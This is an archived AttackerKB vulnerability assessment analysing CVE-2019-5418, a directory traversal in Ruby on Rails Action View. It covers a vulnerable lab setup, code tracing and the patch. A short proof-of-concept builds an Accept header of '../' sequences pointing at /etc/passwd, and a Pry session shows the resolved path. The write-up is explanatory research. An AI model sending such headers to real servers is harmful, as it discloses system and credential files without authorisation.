---
title: Ruby on Rails 5.2 "DoubleTap" Directory Traversal
author: wchen-r7
score: 1
topic_attacker_value: 0
topic_exploitability: 0
topic_disclosure_date: '2019-03-27T14:29:00'
created: '2019-09-12T18:07:32.21733'
revision_date: '2020-02-13T17:12:14.254267'
assessment_id: af7876fe-e6cf-4965-8cdb-8fcf74f45eee
topic_id: 14530fed-0617-4192-812f-b80666a8bdae
topic_short_id: ozf1Ggk3M0
topic_slug: ruby-on-rails-5-2-doubletap-directory-traversal
akb_topic_url: https://attackerkb.com/topics/ozf1Ggk3M0/ruby-on-rails-5-2-doubletap-directory-traversal
akb_assessment_url: https://attackerkb.com/topics/ozf1Ggk3M0/ruby-on-rails-5-2-doubletap-directory-traversal#af7876fe-e6cf-4965-8cdb-8fcf74f45eee
---

# Ruby on Rails 5.2 "DoubleTap" Directory Traversal

*Assessment by wchen-r7, archived from [AttackerKB](https://attackerkb.com/topics/ozf1Ggk3M0/ruby-on-rails-5-2-doubletap-directory-traversal#af7876fe-e6cf-4965-8cdb-8fcf74f45eee).*

---

# Background

Ruby on Rails is a server-side web application framework written in Ruby. It is a model-view-controller (MVC) archtecture, providing default structures for a database, a web service, and web pages. It is also a popular choice of framework among well known services and products such as Github, Bloomberg, Soudcloud, Groupon, Twitch.tv, and of course, Rapid7's Metasploit.

Ruby on Rails versions including 5.2.2.1 and prior are vulnerable to directory traversal in Action View. More specifically, a specially crafted accept header in combination with calls to `reander file:` can cause arbitrary files on the target server to be rendered, disclosing the file contents.

In this documentation, I'll go over:

* The setup I used to test the vulnerable environment.
* My analysis on the vulnerability. Including the basics on how Rails utilities rendering. Also, based on that knowledge, how the directory traversal happens.
* Some information about patching.

# Vulnerable Setup

In order to set up a vulnerable box for testing, do the following on a Linux (Ubuntu) machine, assuming rvm is already installed:

```bash
$ rvm gemset create test
$ rvm gemset use test
$ gem install rails '5.2.1'
$ rails new demo
```

Next, `cd` to demo, and then modify the Gemfile like this:

```bash
$ echo "gem 'rails', '5.2.1'" >> Gemfile
$ echo "gem 'sqlite3', '~> 1.3.6', '< 1.4'" >> Gemfile
$ echo "source 'https://rubygems.org'" >> Gemfile
$ bundle
```

Next, add a new controller:

```bash
rails generate controller metasploit
```

And add the index method for that controller (under app/controllers/metasploit_controller.rb):

```ruby
class MetasploitController < ApplicationController
  def index
    render file: "#{Rails.root}/test.html"
  end
end
```

In the root directory, add a new test.html.

```bash
echo Hello World > test.html
```

Also, add that new route in config/routes.rb:

```ruby
Rails.application.routes.draw do
  resources :metasploit
end
```

And finally, start the application:

```bash
rails s -b 0.0.0.0
```

# Vulnerability Analysis

An advisory was already made available by the time the vulnerability was published. The first paragraph of that advisory pretty much explains the most important piece of the problem:

> There is a possible file content disclosure vulnerability in Action View. Specially crafted accept headers in combination with calls to `render file:` can cause arbitrary files on the target server to be rendered, disclosing the file contents.

So knowing that about Action View, we want to examine the code to understand how rendering works for a file. To begin on a vulnerable machine, we can use the `gem env` command to locate the gems:

```
$ gem env
RubyGems Environment:
  - RUBYGEMS VERSION: 3.0.1
  - RUBY VERSION: 2.6.0 (2018-12-25 patchlevel 0) [x86_64-linux]
  - INSTALLATION DIRECTORY: /home/sinn3r/.rvm/gems/ruby-2.6.0
  - USER INSTALLATION DIRECTORY: /home/sinn3r/.gem/ruby/2.6.0
  - RUBY EXECUTABLE: /home/sinn3r/.rvm/rubies/ruby-2.6.0/bin/ruby
  - GIT EXECUTABLE: /usr/bin/git
  - EXECUTABLE DIRECTORY: /home/sinn3r/.rvm/gems/ruby-2.6.0/bin
  - SPEC CACHE DIRECTORY: /home/sinn3r/.gem/specs
  - SYSTEM CONFIGURATION DIRECTORY: /home/sinn3r/.rvm/rubies/ruby-2.6.0/etc
  - RUBYGEMS PLATFORMS:
    - ruby
    - x86_64-linux
  - GEM PATHS:
     - /home/sinn3r/.rvm/gems/ruby-2.6.0
     - /home/sinn3r/.rvm/rubies/ruby-2.6.0/lib/ruby/gems/2.6.0

... omitted below ...
```

The first path from `GEM PATHS` is what we want, which is where the Action View gem is saved:

```
/home/sinn3r/.rvm/gems/ruby-2.6.0/gems/actionview-5.2.1
```

Since the bug is related to rendering a file, the `find` command reveals the following files associated with rendering that we can investigate:

```
$ find . -name *render*
./lib/action_view/renderer
./lib/action_view/renderer/renderer.rb
./lib/action_view/renderer/partial_renderer
./lib/action_view/renderer/partial_renderer.rb
./lib/action_view/renderer/template_renderer.rb
./lib/action_view/renderer/abstract_renderer.rb
./lib/action_view/renderer/streaming_template_renderer.rb
./lib/action_view/rendering.rb
./lib/action_view/helpers/rendering_helper.rb
```

## The Mechanics of Rails Rendering

It is easy to narrow down what we should be looking at, because there aren't that many files using the `:file` key, which is what the advisory describes. I decided to start with rendering_helper.rb (the `ActionView::Helpers::RenderingHelper` module), which seems to be a mixin for rendering, and hopefully I can eventually find the buggy code that way.

Here's the `render` method `ActionView::Helpers::RenderingHelper`, it's great that there's API documentation:

```ruby
# Returns the result of a render that's dictated by the options hash. The primary options are:
#
# * <tt>:partial</tt> - See <tt>ActionView::PartialRenderer</tt>.
# * <tt>:file</tt> - Renders an explicit template file (this used to be the old default), add :locals to pass in those.
# * <tt>:inline</tt> - Renders an inline template similar to how it's done in the controller.
# * <tt>:plain</tt> - Renders the text passed in out. Setting the content
#   type as <tt>text/plain</tt>.
# * <tt>:html</tt> - Renders the HTML safe string passed in out, otherwise
#   performs HTML escape on the string first. Setting the content type as
#   <tt>text/html</tt>.
# * <tt>:body</tt> - Renders the text passed in, and inherits the content
#   type of <tt>text/plain</tt> from <tt>ActionDispatch::Response</tt>
#   object.
#
# If no options hash is passed or :update specified, the default is to render a partial and use the second parameter
# as the locals hash.
def render(options = {}, locals = {}, &block)
  case options
  when Hash
    if block_given?
      view_renderer.render_partial(self, options.merge(partial: options[:layout]), &block)
    else
      view_renderer.render(self, options)
    end
  else
    view_renderer.render_partial(self, partial: options, locals: locals, &block)
  end
end
```

Notice this is more like a wrapper that relies on `view_renderer`, which is an `ActionView::Renderer` object. OK, let's take a look at that.

## The ActionView::Renderer class

The `ActionView::Renderer` class starts off with its own documentation, which makes it easy to understand its purpose and usage:

> This is the main entry point for rendering. It basically delegates to other objects like TemplateRenderer and PartialRenderer which actually renders the template.
>
> The Renderer will parse the options from the render or render_body method and render a partial or a template based on the options. The TemplateRenderer and PartialRenderer objects are wrappers which do all the setup and logic necessary to render a view and a new object is created each time render is called.

Looking at that, we learn one of these three classes could be used: StreamingTemplateRenderer, TemplateRenderer, and PartialRenderer. It isn't hard to figure out which one we should be looking at, because since the advisory says we are looking at a `render` function for `:file`, it is clear we should be looking at **TemplateRenderer** because only that one is checking the `:file` key.

## The ActionView::TemplateRenderer Class

Inside the TemplateRenderer class, there is only one public method, which is the `render` method. When this is called, the method performs the following for our template:

```ruby
template = determine_template(options)
prepend_formats(template.formats)
@lookup_context.rendered_format ||= (template.formats.first || formats.first)
render_template(template, options[:layout], options[:locals])
```

Inside `determine_template` is when our `:file` key is actually used for the first time:

```ruby
elsif options.key?(:file)
  with_fallbacks { find_file(options[:file], nil, false, keys, @details) }
```

`find_file` is the first thing that gets called. To find this, a quick search in the file system with `grep` identifies two files that are associated with this name:

```
$ grep -iR "def " * |grep find_file
lib/action_view/lookup_context.rb:      def find_file(name, prefixes = [], partial = false, keys = [], options = {})
lib/action_view/path_set.rb:    def find_file(path, prefixes = [], *args)
```

After a bit of code reading, the functionality of `find_file` is seen in the lib/action_view/path_set.rb file:

```ruby
def find_file(path, prefixes = [], *args)
  _find_all(path, prefixes, args, true).first || raise(MissingTemplate.new(self, path, prefixes, *args))
end

...

private

def _find_all(path, prefixes, args, outside_app)
  prefixes = [prefixes] if String === prefixes
  prefixes.each do |prefix|
    paths.each do |resolver|
      if outside_app
        templates = resolver.find_all_anywhere(path, prefix, *args)
      else
        templates = resolver.find_all(path, prefix, *args)
      end
      return templates unless templates.empty?
    end
  end
  []
end
```

### The PathResolver Class

Notice in the above code, `outside_app` is hardcoded to true, so we want to be looking at `find_all_anywhere`. This method can be found in in the `PathResolver` class in lib/action_view/template/resolver.rb:

```ruby
def find_all_anywhere(name, prefix, partial = false, details = {}, key = nil, locals = [])
  cached(key, [name, prefix, partial], details, locals) do
    find_templates(name, prefix, partial, details, true)
  end
end
```

Going down to that rabbit hole, let's just keep reading what `find_templates` is doing:

```ruby
def find_templates(name, prefix, partial, details, outside_app_allowed = false)
  path = Path.build(name, prefix, partial)
  query(path, details, details[:formats], outside_app_allowed)
end

def query(path, details, formats, outside_app_allowed)
  query = build_query(path, details)

  template_paths = find_template_paths(query)
  template_paths = reject_files_external_to_app(template_paths) unless outside_app_allowed

  template_paths.map do |template|
    handler, format, variant = extract_handler_and_format_and_variant(template)
    contents = File.binread(template)

    Template.new(contents, File.expand_path(template), handler,
      virtual_path: path.virtual,
      format: format,
      variant: variant,
      updated_at: mtime(template)
      )
  end
end
```

There are some interesting things about the `query` method. Although at first glance, you wouldn't know exactly what those functions do, but Ruby is such an easy-to-read language, you still get an idea what this method is trying to do just by reading.

For example, this line implies it is for building some kind of query that is associated with a path. This line is actually extra important, which I will explain in a separate section later:

```ruby
query = build_query(path, details)
```

In the next line, this seems to be loading template paths as the name implies:

```ruby
template_paths = find_template_paths(query)
```

And then it passes those paths to this block of code:

```ruby
template_paths.map do |template|
  handler, format, variant = extract_handler_and_format_and_variant(template)
  contents = File.binread(template)
  ...
```

Which clearly loads the content of the files indivisually. And then finally:

```ruby
Template.new(contents, File.expand_path(template), handler,
  virtual_path: path.virtual,
  format: format,
  variant: variant,
  updated_at: mtime(template)
  )
```

This means the content gets converted into a Template object, and that is returned all the way to the `determine_template` function we were looking at originally:

```ruby
template = determine_template(options)
prepend_formats(template.formats)
@lookup_context.rendered_format ||= (template.formats.first || formats.first)
render_template(template, options[:layout], options[:locals])
```

It looks like if the user is able to control the template name, then the `query` method will just load whatever you want, load the file, and pass it for rendering. Well, a normal Rails application probably would not want to let you load whatever you file, because that obviously would be too risky, but CVE-2019-5418 found its way.

## From HTTP Header to Directory Traversal

Now that we have a basic understanding of the rendering mechanics, the next question is: How does a directroy traversal occur from an HTTP **ACCEPT** header? Typically that is not how a directory traversal attack would work against a web server, but for CVE-2019-5418, it is. The proof-of-concept demonstrates:

```ruby
def get_accept_header_value(depth, file)
  return (('../'*depth) + file + '{{').gsub('//', '/')
end


res = send_request_cgi({
  'method' => 'GET',
  'uri' => normalize_uri(datastore['ROUTE']),
  'headers' => { 'Accept' => get_accept_header_value(datastore['DEPTH'], '/etc/passwd')}
  })
```

The reason our HTTP ACCEPT header ends up being loaded as a template is because the way the `query` method works. As you already know, this method's main job is to load a file, and then convert that content into a Template object. Well, something funny happens in this method when it tries to call `build_query`:

```ruby
def build_query(path, details)
  query = @pattern.dup

  prefix = path.prefix.empty? ? "" : "#{escape_entry(path.prefix)}\\1"
  query.gsub!(/:prefix(\/)?/, prefix)

  partial = escape_entry(path.partial? ? "_#{path.name}" : path.name)
  query.gsub!(/:action/, partial)

  details.each do |ext, candidates|
    if ext == :variants && candidates == :any
      query.gsub!(/:#{ext}/, "*")
    else
      query.gsub!(/:#{ext}/, "{#{candidates.compact.uniq.join(',')}}")
    end
  end

  File.expand_path(query, @path)
end
```

The `@pattern` variable holds this value as a string:

```ruby
:prefix/:action{.:locale,}{.:formats,}{+:variants,}{.:handlers,}
```

The details argument is actually a hash that looks like the following. Notice the directory traversal string in the `:formats` key, which indicates where the HTTP ACCEPT header is stored:

```ruby
{:locale=>[:en], :formats=>["../../../../../../../../../../etc/passwd{{"], :variants=>[], :handlers=>[:raw, :erb, :html, :builder, :ruby, :coffee, :jbuilder]}
```

Looking at the Ruby code, we know that it is just simply replacing specific parts of the string with the hash above. When it comes to the `formats` pattern, it is replaced with the ACCEPT header due to this line:

```ruby
query.gsub!(/:#{ext}/, "{#{candidates.compact.uniq.join(',')}}")
```

After the modification, our string actually looks like this:

```ruby
"home/sinn3r/demo/test.html{.{en},}{.{../../../../../../../../../../etc/passwd{{},}{+{},}{.{raw,erb,html,builder,ruby,coffee,jbuilder},}"
```

After the `File.expand_path` call, the query string is actually:

```ruby
"/etc/passwd{{},}{+{},}{.{raw,erb,html,builder,ruby,coffee,jbuilder},}"
```

After this query is created, it is passed to the next method called `fine_template_paths`, which will actually normalize the query for us:

```ruby
def find_template_paths(query)
  Dir[query].uniq.reject do |filename|
    File.directory?(filename) ||
      # deals with case-insensitive file systems.
    !File.fnmatch(query, filename, File::FNM_EXTGLOB)
  end
```

Using Pry (an interactive shell for Ruby), we can demonstrate this problem:

```ruby
[7] pry(#<ActionView::FallbackFileSystemResolver>)> path = File.expand_path("home/sinn3r/demo/test.html{.{en},}{.{../../../../../../../../../../etc/passwd{{},}{+{},}{.{raw,erb,html,builder,ruby,coffee,jbuilder},}", @path)
=> "/etc/passwd{{},}{+{},}{.{raw,erb,html,builder,ruby,coffee,jbuilder},}"
[8] pry(#<ActionView::FallbackFileSystemResolver>)> find_template_paths(path)
=> ["/etc/passwd"]
```

After that point, the path will be used to create a Template object, and the application ends up loading something that it's not supposed to load. That is our directory traversal bug.

## Patching

The way CVE-2019-5418 is patched is quite simple. Instead of allowing any formats, Rails now only allows the registered MIME types, which makes sense because "registered" implies trusted:

```ruby
v = v.select do |format|
  format.symbol || format.ref == "*/*"
end
```

However, I can't help but feel the way the `build_query` method is written, and how it is used, is prone to problems. `gsub` is probably too much freedom on a string, especially that string is used as a file path.
